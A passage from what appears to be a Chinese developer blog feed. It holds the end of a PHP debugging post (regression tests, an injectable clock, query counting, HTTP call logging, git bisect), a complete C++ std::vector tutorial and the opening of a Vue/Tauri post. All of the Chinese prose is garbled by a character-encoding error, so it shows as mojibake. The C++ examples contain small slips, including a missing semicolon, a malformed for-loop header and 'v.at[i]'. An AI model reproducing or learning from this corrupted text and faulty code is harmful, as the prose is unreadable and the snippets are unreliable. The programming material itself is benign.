<li>æ¶é´ç¸å³æ¡ä»¶ï¼æ¶åºãå½åæ¥æãå¤ä»¤æ¶ï¼</li>
<li>å¹¶åæ¡ä»¶ï¼1 ä¸ªè¯·æ± vs 10 ä¸ªå¹¶åï¼</li>
<li>æ°æ®åç½®æ¡ä»¶ï¼ç¹å®çæ°æ®åºè¡ï¼</li>
</ul>
<p>ç¶åç²¾ç®ã</p>
<p>å¦æä½ çåºç¨éè¦ 20 æ­¥æè½å¤ç°ï¼ç®æ æ¯ 3 æ­¥ãå¦æéè¦ 3 æ­¥ï¼ç®æ æ¯ 1 æ­¥ã</p>
<h3 id="æ-bug-åææµè¯ç¨ä¾">æ bug åææµè¯ç¨ä¾</h3>
<p>è¿æ¯çæ­£çå¢éé»æ­¢åå½çæ¹å¼ã</p>
<p>ç¤ºä¾ï¼ä¸ä¸ªå¾®å¦çææ£èå¥ bugï¼åªå¨ç¹å®ä»·æ ¼æ¶åºç°ã</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

final class Discount
{
    public function apply(int $priceCents, int $percent): int
    {
        $cut = (int) round($priceCents * ($percent / 100));
        return max(0, $priceCents - $cut);
    }
}
</code></pre>
<p>ååå½æµè¯ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

use PHPUnit\Framework\TestCase;
final class DiscountTest extends TestCase
{
    public function testRoundingEdgeCase(): void
    {
        $d = new Discount();
        // Bug æ¥åï¼999 åé±æ 10% ææ£äº§çäº 900 èé 899
        $this-&gt;assertSame(899, $d-&gt;apply(999, 10));
    }
}
</code></pre>
<p>ç°å¨ä½ æäºï¼</p>
<ul>
<li>å ç§éå°±è½è·å®çå¤ç°</li>
<li>é²æ­¢ä»¥åéæ°å¼å¥ bug çå®å¨ç½</li>
</ul>
<h3 id="æ¶é´ç¸å³ç-bugå»ç»æ¶é´">æ¶é´ç¸å³ç bugï¼å»ç»æ¶é´</h3>
<p>å¦æä½ çä»£ç ä¾èµæ¶é´ï¼ä½ ä¼è¿½é¬¼ã</p>
<p>å¨åºç¨ä»£ç ä¸­ï¼åè£"ç°å¨"ï¼</p>
<pre><code class="language-php">&lt;?php
interface Clock {
    public function now(): DateTimeImmutable;
}

final class SystemClock implements Clock {
    public function now(): DateTimeImmutable {
        return new DateTimeImmutable('now');
    }
}
</code></pre>
<p>å¨æµè¯ä¸­ï¼æ³¨å¥åºå®ç clockãä½ çè°è¯å°±åå¾ç¡®å®æ§äºã</p>
<h2 id="è¾¹çè°è¯æ°æ®åºåå¤é¨-api">è¾¹çè°è¯ï¼æ°æ®åºåå¤é¨ API</h2>
<p>å¨ç°ä»£ PHP åºç¨ä¸­ï¼bug å¾å¾ä¸å¨ä½ çä¸å¡é»è¾éãå®å¨ï¼</p>
<ul>
<li>è¿åæå¤ç»æçæ¥è¯¢</li>
<li>N+1 æ¥è¯¢æ¨¡å¼</li>
<li>å¯¼è´è¶æ¶çæ¢äºå¡</li>
<li>è¿åå¾®å¦ä¸å payload çå¤é¨ API</li>
</ul>
<h3 id="æ°æ®åºåçæ¥è¯¢æ°é">æ°æ®åºï¼åçæ¥è¯¢æ°é</h3>
<p>å¦æä½ çæ¥å£çªç¶åæ¢ï¼ç¬¬ä¸ä¸ªé®é¢å¾å¾æ¯ï¼"è¿ä¸ªè¯·æ±æ§è¡äºå¤å°æ¥è¯¢ï¼"</p>
<p>æ¡æ¶æ å³çæ¹å¼ï¼PDO åè£å¨ï¼å¯ä»¥è®¡æ°æ¥è¯¢ãLaravel/Symfony å¯ä»¥æ¥å¥å®ä»¬çæ°æ®åº profiler åè½ãä¸ç®¡ä»ä¹ææ¯æ ï¼ä¹ æ¯æ¯ä¸æ ·çï¼</p>
<ul>
<li>æè·æ¥è¯¢æ°é</li>
<li>æè·æ¢æ¥è¯¢</li>
<li>å°å¿æè·åæ°ï¼é¿åæ³é²ææä¿¡æ¯ï¼</li>
</ul>
<p>ç¤ºä¾ï¼æ¦å¿µæ§ä¼ªåè£å¨ï¼ï¼</p>
<pre><code class="language-php">&lt;?php
final class Db
{
    private int $count = 0;
    public function __construct(private PDO $pdo) {}
    public function query(string $sql, array $params = []): array
    {
        $this-&gt;count++;
        $stmt = $this-&gt;pdo-&gt;prepare($sql);
        $stmt-&gt;execute($params);
        return $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
    }
    public function queryCount(): int { return $this-&gt;count; }
}
</code></pre>
<p>è¯·æ±ç»ææ¶ï¼</p>
<pre><code class="language-php">$logger-&gt;info('request.db', [
  'request_id' =&gt; $reqId,
  'query_count' =&gt; $db-&gt;queryCount(),
]);
</code></pre>
<h3 id="å¤é¨-httpè®°å½åæ°æ®å«è®°-body">å¤é¨ HTTPï¼è®°å½åæ°æ®ï¼å«è®° body</h3>
<p>ä½ éè¦çæ¯ï¼</p>
<ul>
<li>method</li>
<li>host/path</li>
<li>status</li>
<li>duration</li>
<li>retries</li>
<li>å³è ID</li>
</ul>
<p>ç¤ºä¾åè£å¨ï¼</p>
<pre><code class="language-php">&lt;?php
function callPartnerApi(string $url, array $headers): array
{
    $start = microtime(true);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER =&gt; true,
        CURLOPT_HTTPHEADER =&gt; array_map(
            fn($k, $v) =&gt; "$k: $v",
            array_keys($headers),
            $headers
        ),
        CURLOPT_TIMEOUT =&gt; 10,
        CURLOPT_CONNECTTIMEOUT =&gt; 3,
    ]);
    $body = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $durationMs = (int) ((microtime(true) - $start) * 1000);
    curl_close($ch);
    error_log(json_encode([
        'event' =&gt; 'http.out',
        'url' =&gt; $url,
        'status' =&gt; $status,
        'duration_ms' =&gt; $durationMs,
    ]));
    return ['status' =&gt; $status, 'body' =&gt; $body];
}
</code></pre>
<p><strong>è°è¯æ¶ç</strong>ï¼ä¸æ¦ä½ æäºå¸¦è¯·æ± ID ç duration å status æ¥å¿ï¼ä½ å°±ä¸ç¨åç bug æ¯"æä»¬çé®é¢"è¿æ¯"åä½æ¹ API è´è½½è¿é«"äºã</p>
<h2 id="ç¡¬æ ¸ææ®µäºåæ³git-bisectæ­è¨å®å«">ç¡¬æ ¸ææ®µï¼äºåæ³ãgit bisectãæ­è¨å®å«</h2>
<p>å¡ä½çæ¶åï¼æ´åå¾å¾æ¯èªææ´ææã</p>
<h3 id="äºåæ³å®ä½ä»£ç è·¯å¾">äºåæ³å®ä½ä»£ç è·¯å¾</h3>
<p>å¦æä½ æä¸ä¸ªå¤ææµç¨ï¼ç»è´¦ãé¢è®¢ãå®¡æ¹æµæ°´çº¿ï¼ï¼å«è¯»æ´ä¸ªä»£ç åºãç¼©å°èå´ã</p>
<ol>
<li>å¨å¯çåºåçå¼å¤´å ä¸æ¡æ¥å¿</li>
<li>å¨ç»å°¾å ä¸æ¡æ¥å¿</li>
<li>å¦æå¼å¤´çæ¥å¿åºç°äºä½ç»å°¾çæ²¡åºç°ï¼bug å°±å¨éé¢</li>
<li>æåºåä¸åä¸ºäºï¼éå¤</li>
</ol>
<p>è¿å°±æ¯"ä»£ç çäºåæ¥æ¾"ãæææäººã</p>
<h3 id="åå½-bug-ç¨-git-bisect">åå½ bug ç¨ git bisect</h3>
<p>å¦æä¸ä¸ª bug"æè¿æå¼å§åºç°"ï¼å«äºè®ºäºï¼ç´æ¥ bisectã</p>
<pre><code class="language-bash">git bisect start
git bisect bad HEAD
git bisect good &lt;å·²ç¥æ­£å¸¸ç-commit-æ-tag&gt;
</code></pre>
<p>ç¶åè¿è¡ä¸ä¸ªè½å¤ç°é®é¢çèæ¬/æµè¯ï¼æ¯ä¸æ­¥æ è®° good/badï¼ç´å° Git æ¾å°å¼å¥ bug ç commitã</p>
<p>å¦æä½ æ²¡æå¤ç°èæ¬ï¼é£å°±æ¯ä½ çç¬¬ä¸ä¸ªä»»å¡ï¼è§æè½ 5ï¼ã</p>
<h3 id="å¨è¾¹çå æ­è¨å®å«">å¨è¾¹çå æ­è¨å®å«</h3>
<p>å¤§éè°è¯æ¶é´è±å¨å¤ç"ä¸å¯è½çç¶æåæäºå¯è½"ä¸ã</p>
<p>æ·»å å¿«éå¤±è´¥å¹¶å¸¦æ¸æ°æ¶æ¯çå®å«ï¼</p>
<pre><code class="language-php">&lt;?php
declare(strict_types=1);

function requireNonEmptyString(mixed $v, string $name): string {
    if (!is_string($v) || trim($v) === '') {
        throw new InvalidArgumentException("$name must be a non-empty string");
    }
    return $v;
}
</code></pre>
<p>å¨ bug èéçå°æ¹ä½¿ç¨å®ï¼è§£æè¾å¥ãè¯»åç¯å¢åéãå¤çå¤é¨ payloadã</p>
<p>ç¤ºä¾ï¼</p>
<pre><code class="language-php">$apiKey = requireNonEmptyString(getenv('PARTNER_API_KEY'), 'PARTNER_API_KEY');
</code></pre>
<p>è¿ä¸æ¯"é¢å¤ä»£ç "ãè¿æ¯è°è¯é¢é²ã</p>
<h2 id="å®æ´çè°è¯å·¥ä½æµ">å®æ´çè°è¯å·¥ä½æµ</h2>
<p>éå° bug æ¶ï¼è·è¿ä¸ªå¾ªç¯ï¼</p>
<h3 id="ç¬¬ä¸æ­¥è®©éè¯¯å¯è§">ç¬¬ä¸æ­¥ï¼è®©éè¯¯å¯è§</h3>
<p>ç¡®è®¤éè¯¯è®¾ç½®åæ¥å¿ï¼æè½ 1ï¼ãæ¿å°çæ­£çå æ è·è¸ªã</p>
<h3 id="ç¬¬äºæ­¥å¤ç°">ç¬¬äºæ­¥ï¼å¤ç°</h3>
<p>ç²¾ç®æ­¥éª¤ãæè·è¾å¥ãè®©å®ç¡®å®æ§ï¼æè½ 5ï¼ã</p>
<h3 id="ç¬¬ä¸æ­¥éå·¥å·">ç¬¬ä¸æ­¥ï¼éå·¥å·</h3>
<ul>
<li>ä¸ä¸ªåééäºï¼<code>dump()</code> ä¸ä¸ªå°å½¢ç¶ï¼æè½ 3ï¼</li>
<li>æ§å¶æµä¸æ¸æ¥ï¼Xdebug æ­¥è¿è°è¯ï¼æè½ 2ï¼</li>
<li>åå¸å¼/ç³»ç»é®é¢ï¼å³è ID + ç»æåæ¥å¿ï¼æè½ 4ï¼</li>
<li>åå½ï¼git bisectï¼æè½ 7ï¼</li>
</ul>
<h3 id="ç¬¬åæ­¥ä¿®å¤å¹¶éå®">ç¬¬åæ­¥ï¼ä¿®å¤å¹¶éå®</h3>
<p>æ·»å æµè¯æå®å«ï¼è®©å®ä¸ååæ¥ï¼æè½ 5 / æè½ 7ï¼ã</p>
<p>è¿å°±æ¯æ´ä¸ªæ¸¸æã</p>
<h2 id="ç»è¯­">ç»è¯­</h2>
<p>æå¥½ç PHP è°è¯èæ²¡æç¥å¥çç´è§ãä»ä»¬ææ´å¥½çåé¦å¾ªç¯ã</p>
<ul>
<li>éè¯¯å¯è§ä½ä¸æ³é²ï¼PHP å®æ¹ä¹å»ºè®®å¨çäº§ç¯å¢è®°å½èéæ¾ç¤ºï¼</li>
<li>çä¸åºæ¥æ¶ææ­¥è¿è°è¯å¯ç¨ï¼Xdebug å°±æ¯ä¸ºæ­¤èçï¼</li>
<li>dump å¯è¯»ä¸ææè¯ï¼VarDumper ç <code>dump()</code> å­å¨æ¯å ä¸º <code>var_dump()</code> å¤ªçè¦ï¼</li>
<li>æ¥å¿å¨æ§è¡è¿ç¨ä¸­æºå¸¦ä¸ä¸æï¼Laravel æç¡®æ¯æå¨æ¥å¿ä¸­åå« contextï¼</li>
<li>bug åæå¯å¤ç°çæµè¯ï¼èéåå¤åºç°çæäº</li>
</ul>
<p>å°½æ©ææ¡è¿ä¸ä¸ªæè½ï¼ä½ ç"è°è¯æ¶é´"ä¼å¤§å¹ç¼©ç­ââä¸æ¯å ä¸º bug æ¶å¤±äºï¼èæ¯å ä¸ºä½ çç³»ç»ä¸åå¯¹ä½ éèçç¸ã</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-04 08:02">2026-01-04 08:01</span>&nbsp;
<a href="https://www.cnblogs.com/catchadmin">JaguarJack</a>&nbsp;
éè¯»(<span id="post_view_count">42</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19435596);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19435596', targetLink: 'https://www.cnblogs.com/catchadmin/p/19435596', title: '7 ä¸ªä»å¥é¨å°èµæ·± PHP å¼åèé½å¨ç¨çæ ¸å¿è°è¯æè½' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ C++ ä¸­ç vector ]]></title>
    <link>https://www.cnblogs.com/bfmhno3/p/19435123</link>
    <guid>4be261430928362d4740ae2c816f1898</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/bfmhno3/p/19435123" title="åå¸äº 2026-01-03 23:00">
    <span role="heading" aria-level="2">C++ ä¸­ç vector</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        æ·±å¥çè§£ C++ ä¸­æå¸¸ç¨çå®¹å¨ std::vectorï¼å¨ææ°ç»çæ ¸å¿ç¹æ§ãåå­ç®¡çãæ©å®¹æºå¶ãè¿­ä»£å¨å¤±æé®é¢ï¼ä»¥å reserveãemplace_back ç­ç°ä»£åæä½³å®è·µãç¹å«æé std::vector
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#æ ¸å¿ç¹æ§ä¸åºå±åç" rel="noopener nofollow">æ ¸å¿ç¹æ§ä¸åºå±åç</a></li><li><a href="#åå§åä¸æé " rel="noopener nofollow">åå§åä¸æé </a></li><li><a href="#å®¹éä¸å¤§å°" rel="noopener nofollow">å®¹éä¸å¤§å°</a><ul><li><a href="#ä¸ºä»ä¹-reserve-éå¸¸éè¦" rel="noopener nofollow">ä¸ºä»ä¹ <code>reserve</code> éå¸¸éè¦ï¼</a></li></ul></li><li><a href="#å¢å æ¥æ¹" rel="noopener nofollow">å¢å æ¥æ¹</a><ul><li><a href="#æå¥ä¸æ·»å " rel="noopener nofollow">æå¥ä¸æ·»å </a></li><li><a href="#å é¤" rel="noopener nofollow">å é¤</a></li><li><a href="#è®¿é®" rel="noopener nofollow">è®¿é®</a></li></ul></li><li><a href="#è¿­ä»£å¨å¤±æ" rel="noopener nofollow">è¿­ä»£å¨å¤±æ</a></li><li><a href="#ç¹æ®çæ¬stdvectorbool" rel="noopener nofollow">ç¹æ®çæ¬ï¼<code>std::vector&lt;bool&gt;</code></a></li><li><a href="#ç°ä»£åæä½" rel="noopener nofollow">ç°ä»£åæä½</a><ul><li><a href="#c20stderase-å-stderase_if" rel="noopener nofollow">C++20ï¼<code>std::erase</code> å <code>std::erase_if</code></a></li></ul></li><li><a href="#æä½³å®è·µ" rel="noopener nofollow">æä½³å®è·µ</a></li></ul></div><p></p>
<blockquote>
<p><strong>æ¬æé¦åäºæçä¸ªäººåå®¢ï¼<a href="https://bfmhno3.github.io/" target="_blank" rel="noopener nofollow">Better Mistakes</a></strong></p>
<p><strong>çæå£°æ</strong>ï¼æ¬æä¸ºååæç« ï¼è½¬è½½è¯·éä¸åæåºå¤é¾æ¥åæ¬å£°æã<br>
ç±äºææ¯è¿­ä»£è¾å¿«ï¼æç« åå®¹å¯è½éæ¶æ´æ°ï¼å«åè¯¯åè¡¥åï¼ãä¸ºäºç¡®ä¿æ¨çå°çæ¯ææ°çæ¬ï¼å¹¶è·å¾æ´å¥½çä»£ç éè¯»ä½éªï¼è¯·è®¿é®ï¼</p>
<p>ð­ <strong>åæé¾æ¥</strong>ï¼<a href="https://bfmhno3.github.io/note/vector-in-cpp/" target="_blank" rel="noopener nofollow">https://bfmhno3.github.io/note/vector-in-cpp/</a></p>
</blockquote>
<hr>
<p><code>std::vector</code> æ¯ C++ ä¸­<strong>æéè¦</strong>ã<strong>æå¸¸ç¨</strong>çå®¹å¨ï¼æ²¡æä¹ä¸ãå®çæ¬è´¨æ¯<strong>å¨ææ°ç»</strong>ï¼Dynamic Arrayï¼ã</p>
<p><code>std::vector</code> æ¯å¨å ï¼Heapï¼ä¸ç®¡çä¸åè¿ç»­çåå­ï¼å¯ä»¥å­æ¾ä»»æç±»åçå¯¹è±¡ã</p>
<h2 id="æ ¸å¿ç¹æ§ä¸åºå±åç">æ ¸å¿ç¹æ§ä¸åºå±åç</h2>
<ul>
<li>å¤´æä»¶ï¼<code>#include &lt;vector&gt;</code></li>
<li>åå­æ¨¡åï¼<strong>è¿ç»­åå­</strong>ãè¿æå³çå®å C æ°ç»ä¸æ ·ï¼æ¯æéè¿æéåç§»éå¿«éè®¿é®ï¼å¹¶ä¸å¯¹ CPU ç¼å­ï¼Cacheï¼éå¸¸åå¥½ã</li>
<li><strong>èªå¨æ©å®¹</strong>ï¼å½å­å¥æ°æ®éè¶è¿å½åå®¹éæ¶ï¼<code>std::vector</code> å°±ä¼ç³è¯·ä¸åæ´å¤§çåå­ï¼éå¸¸æ¯åæ¥ç 1.5 åæ 2 åï¼ï¼å°æ§æ°æ®ç§»å¨/æ·è´è¿å»ï¼ç¶åéæ¾æ§åå­ã</li>
</ul>
<h2 id="åå§åä¸æé ">åå§åä¸æé </h2>
<pre><code class="language-cpp">#include &lt;vector&gt;

// 1. é»è®¤æé ï¼ç©º vectorï¼
std::vector&lt;int&gt; v1;

// 2. æå®å¤§å°åé»è®¤å¼
std::vector&lt;int&gt; v2(10);        // 10 ä¸ªåç´ ï¼é»è®¤åå§å 0
std::vector&lt;int&gt; v3(10, 5);     // 10 ä¸ªåç´ ï¼æ¯ä¸ªé½æ¯ 5

// 3. åè¡¨åå§åï¼C++11ï¼
std::vector&lt;int&gt; v4 = {1, 2, 3, 4};

// 4. æ·è´æé 
std::vector&lt;int&gt; v5(v4);

// 5. è¿­ä»£å¨èå´æé ï¼å¸¸ç¨ä¸ä»å¶ä»å®¹å¨æ·è´ï¼
int arr[] = {10, 20, 30}
std::vector&lt;int&gt; v6(arr, arr + 3);
</code></pre>
<h2 id="å®¹éä¸å¤§å°">å®¹éä¸å¤§å°</h2>
<table>
<thead>
<tr>
<th style="text-align: left">å½æ°</th>
<th style="text-align: left">è¯´æ</th>
<th style="text-align: left">å¤æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left"><code>size()</code></td>
<td style="text-align: left">å½ååç´ ä¸ªæ°</td>
<td style="text-align: left">å®éå­äºå¤å°ä¸ª</td>
</tr>
<tr>
<td style="text-align: left"><code>capacity()</code></td>
<td style="text-align: left">å½ååéçåå­è½å­å¤å°ä¸ª</td>
<td style="text-align: left"><code>capacity</code> <span class="math inline">\(\geqslant\)</span> <code>size</code></td>
</tr>
<tr>
<td style="text-align: left"><code>empty()</code></td>
<td style="text-align: left">æ¯å¦ä¸ºç©º</td>
<td style="text-align: left">æ¨èä½¿ç¨ï¼æ¯ <code>size() == 0</code> æ´è¯­ä¹å</td>
</tr>
<tr>
<td style="text-align: left"><code>reserve()</code></td>
<td style="text-align: left">é¢åéåå­</td>
<td style="text-align: left">ä»æ¹å <code>capacity</code>ï¼ä¸æ¹å <code>size</code></td>
</tr>
<tr>
<td style="text-align: left"><code>resize(n)</code></td>
<td style="text-align: left">æ¹ååç´ ä¸ªæ°</td>
<td style="text-align: left">æ¹å <code>size</code>ï¼å¦æåå¤§åå¡«åé»è®¤å¼</td>
</tr>
<tr>
<td style="text-align: left"><code>shrink_to_fit()</code></td>
<td style="text-align: left">éæ¾æªä½¿ç¨çåå­ï¼C++11ï¼</td>
<td style="text-align: left">è®© <code>capacity</code> æç´¢å° <code>size</code> å¤§å°</td>
</tr>
</tbody>
</table>
<h3 id="ä¸ºä»ä¹-reserve-éå¸¸éè¦">ä¸ºä»ä¹ <code>reserve</code> éå¸¸éè¦ï¼</h3>
<pre><code class="language-cpp">std::vector&lt;int&gt; v;
v.reserve(1000); // ä¸æ¬¡æ§åéå¥½åå­
for (int i = 0; i &lt; 1000; i++) {
    v.push_back(i); // è¿éä¸ä¼ååçåå­éæ°åéï¼æçæé«
}
</code></pre>
<h2 id="å¢å æ¥æ¹">å¢å æ¥æ¹</h2>
<h3 id="æå¥ä¸æ·»å ">æå¥ä¸æ·»å </h3>
<ul>
<li><code>push_back(val)</code>ï¼å¨å°¾é¨æ·»å åç´ ï¼ä¼åçæ·è´æç§»å¨ï¼ã</li>
<li><code>emplace_back(arg...)</code>ï¼C++11ï¼ï¼<strong>åå°æé </strong>ãç´æ¥å¨ <code>std::vector</code> å°¾é¨æé å¯¹è±¡ï¼çå»äºä¸æ¬¡ä¸´æ¶å¯¹è±¡çæé åæ·è´ / ç§»å¨ï¼<strong>æçéå¸¸æ´é«</strong>ã</li>
<li><code>insert(it, val)</code>ï¼å¨è¿­ä»£å¨æåçä½ç½®æå¥ãæçä¸º <span class="math inline">\(O(N)\)</span>ï¼å ä¸ºè¦ç§»å¨åç»­ææåç´ ã</li>
</ul>
<h3 id="å é¤">å é¤</h3>
<ul>
<li><code>pop_back</code>ï¼å é¤å°¾é¨åç´ ï¼<span class="math inline">\(O(1)\)</span>ï¼ã</li>
<li><code>erase(it)</code>ï¼å é¤æå®ä½ç½®åç´ ï¼<span class="math inline">\(O(N)\)</span>ï¼åç»­åç´ åç§»ï¼ã</li>
<li><code>clear()</code>ï¼æ¸ç©ºææåç´ ï¼<code>szie</code> åä¸º 0ï¼ä½ <code>capacity</code> éå¸¸ä¸åï¼åå­ä¸éæ¾ï¼ã</li>
</ul>
<h3 id="è®¿é®">è®¿é®</h3>
<ul>
<li><code>v[i]</code>ï¼ä¸æ è®¿é®ï¼ä¸æ£æ¥è¶çã</li>
<li><code>v.at[i]</code>ï¼æ£æ¥è¶çï¼è¶è§æ <code>std::out_of_range</code>ã</li>
<li><code>v.front()</code> / <code>v.back()</code>ï¼è®¿é®é¦å°¾ã</li>
<li><code>v.data()</code>ï¼è¿åæååºå±æ°ç»é¦åç´ çæéï¼<code>T*</code>ï¼ãå¸¸ç¨äºå C è¯­è¨ API äº¤äºã</li>
</ul>
<h2 id="è¿­ä»£å¨å¤±æ">è¿­ä»£å¨å¤±æ</h2>
<p>ç±äº <code>std::vector</code> æ¯è¿ç»­åå­ï¼å½ç»æåçååæ¶ï¼æåæ§åå­ç<strong>è¿­ä»£å¨</strong>ã<strong>æé</strong>ã<strong>å¼ç¨</strong>å¯è½ä¼å¤±æã</p>
<ol>
<li>æ©å®¹æ¶å¤±æï¼å½ <code>push_back</code> å¯¼è´ <code>std::vector</code> æ©å®¹ï¼<code>reallocate</code>ï¼æ¶ï¼ååå­è¢«éæ¾ï¼<strong>ææ</strong>æååæ°æ®çè¿­ä»£å¨ / æéç¬é´å¨é¨å¤±æã</li>
<li>æå¥ / å é¤æ¶å¤±æï¼å½ <code>insert</code> æ <code>erase</code> ä¸ä¸ªä½ç½®æ¶ï¼è¯¥ä½ç½®<strong>ä¹å</strong>çææè¿­ä»£å¨é½ä¼å¤±æï¼å ä¸ºæ°æ®ç§»å¨äºï¼ã</li>
</ol>
<pre><code class="language-cpp">std::vector&lt;int&gt; v = {1, 2, 3, 4};
for (auto it = v.begin(); it != v.end(); ++it) {
    if (*it % 2 == 0) {
        v.erase(it); // éè¯¯ï¼erase å it å·²å¤±æï¼ä¸ä¸æ¬¡ ++it ä¼å´©æº
    }
}

// æ­£ç¡®åæ³ï¼å©ç¨ erase è¿åå¼æ´æ°è¿­ä»£å¨ï¼
for (auto it =  v.begin(); it != v.end()) {
    if (*it % 2 == 0) {
        it = v.erase(it); // erase è¿åæåä¸ä¸ä¸ªåç´ çè¿­ä»£å¨
    } else {
        ++it;
    }
}
</code></pre>
<h2 id="ç¹æ®çæ¬stdvectorbool">ç¹æ®çæ¬ï¼<code>std::vector&lt;bool&gt;</code></h2>
<p>è¿æ¯ä¸ä¸ªåå²éçç âåâãä¸ºäºèçç©ºé´ï¼C++ æ ååºç¹åäº <code>std::vector&lt;bool&gt;</code>ï¼å®ä¸æ¯å­å¨ <code>bool</code>ï¼1 å­èï¼ï¼èæ¯å­å¨ <code>bit</code>ï¼1 æ¯ç¹ï¼ã</p>
<p>åæï¼</p>
<ul>
<li>ä½ æ æ³è·å¾åç´ çå°åï¼<code>&amp;v[0]</code> æ¯éæ³çï¼å ä¸ºæ æ³å¯»ååä¸ªæ¯ç¹ã</li>
<li>å®ç <code>operator[]</code> è¿åçä¸æ¯ <code>bool&amp;</code>ï¼èæ¯ä¸ä¸ªä»£çå¯¹è±¡ã</li>
<li><strong>éçº¿ç¨å®å¨</strong>ï¼å¹¶åè¯»åé»è¿ç bit å¯è½ä¼å¯¼è´æ°æ®ç«äºï¼å ä¸ºå®ä»¬ä½äºåä¸ä¸ªå­èåï¼ã</li>
</ul>
<p>å»ºè®®ï¼å¦æéè¦å­å¸å°å¼ä¸ä¸ç¼ºé£ç¹åå­ï¼ç¨ <code>std::vector&lt;char&gt;</code> æ <code>std::deque&lt;bool&gt;</code> ä»£æ¿ãå¦æç¡®å®éè¦ä½æä½ï¼èèä½¿ç¨ <code>std::bitset</code>ã</p>
<h2 id="ç°ä»£åæä½">ç°ä»£åæä½</h2>
<h3 id="c20stderase-å-stderase_if">C++20ï¼<code>std::erase</code> å <code>std::erase_if</code></h3>
<p>å¨ C++20 ä¹åï¼è¦ä» <code>std::vector</code> ä¸­å é¤æ»¡è¶³ç¹å®æ¡ä»¶çæä»¥åç´ ï¼éè¦ä½¿ç¨ "Erase-Remove Idiom"ï¼<code>v.erase(std::remove(...), v.end()ï¼</code>ï¼éå¸¸å°å¦ã</p>
<p>C++20 ç®åäºï¼</p>
<pre><code class="language-cpp">std::vector&lt;int&gt; v = {1, 2, 3, 4, 5, 6};

// å é¤ææå¶æ°
std::erase_if(v, [](int x) { return x % 2 == 0; });
</code></pre>
<h2 id="æä½³å®è·µ">æä½³å®è·µ</h2>
<ol>
<li>ä¼åä½¿ç¨ <code>emplace_back</code>ï¼ä»£æ¿ <code>push_back</code>ï¼ç¹å«æ¯å­æ¾å¤æå¯¹è±¡æ¶ã</li>
<li>åç¨ <code>reserve</code>ï¼å¦æä½ è½é¢ä¼°æ°æ®éï¼ä¸å®è¦å <code>reserve</code>ï¼å¨æ°æ®éè¾å¤§æ¶ï¼è½å¤æå¤§çä¼åæ§è½ã</li>
<li>é¿åå¤´é¨/ä¸­é´æå¥ï¼å¨ <code>std::vector</code> å¤´é¨æå¥æ°æ®ï¼<code>insert(begin(), val)</code>ï¼æ¯éå¸¸æ¢çï¼<span class="math inline">\(O(N)\)</span>ï¼ï¼å¦ææè¿ç§éæ±ï¼è¯·æ¹ç¨ <code>std::deque</code> æ <code>std::list</code>ã</li>
<li>æç¨ <code>std::vector&lt;bool&gt;</code>ï¼é¤éä½ æ¸æ¥ä½ èªå·±å¨åä»ä¹ã</li>
<li>å°å¿å¼ç¨å¤±æï¼å¨å¾ªç¯ä¸­å <code>push_back</code> æ¶ï¼åä¸ä¸è¦åæ¶æææåè¯¥ <code>std::vector</code> åé¨åç´ çå¼ç¨ï¼ä¸æ¦æ©å®¹ï¼å¼ç¨å°±åææ¬ç©ºæéäºã</li>
</ol>
<hr>
<blockquote>
<p>ð¢ <strong>åå¨æå</strong></p>
<p>å¦æä½ è§å¾è¿ç¯æç« å¯¹ä½ æå¸®å©ï¼æ¬¢è¿å°æçä¸ªäººåå®¢ <strong><a href="https://bfmhno3.github.io/" target="_blank" rel="noopener nofollow">Better Mistakes</a></strong> ééã</p>
<p>å¨é£éæå½æ¡£äºæ´å¤é«è´¨éçææ¯æç« ï¼ä¹æ¬¢è¿éè¿ RSS è®¢éæçææ°å¨æï¼</p>
</blockquote>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-03 23:00">2026-01-03 23:00</span>&nbsp;
<a href="https://www.cnblogs.com/bfmhno3">ç¥æ æè³æ</a>&nbsp;
éè¯»(<span id="post_view_count">83</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19435123);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19435123', targetLink: 'https://www.cnblogs.com/bfmhno3/p/19435123', title: 'C++ ä¸­ç vector' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä½¿ç¨Vue 3 + TypeScript + Tauriå®ç°ä¸ä¸ªå³æå³ç¨çè½»éçº§å¯æ§è¡ç¨åº ]]></title>
    <link>https://www.cnblogs.com/LEMONIX/p/19435059</link>
    <guid>2d572a92f520fd5d26d1848d24969be5</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/LEMONIX/p/19435059" title="åå¸äº 2026-01-03 22:20">
    <span role="heading" aria-level="2">ä½¿ç¨Vue 3 + TypeScript + Tauriå®ç°ä¸ä¸ªå³æå³ç¨çè½»éçº§å¯æ§è¡ç¨åº</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
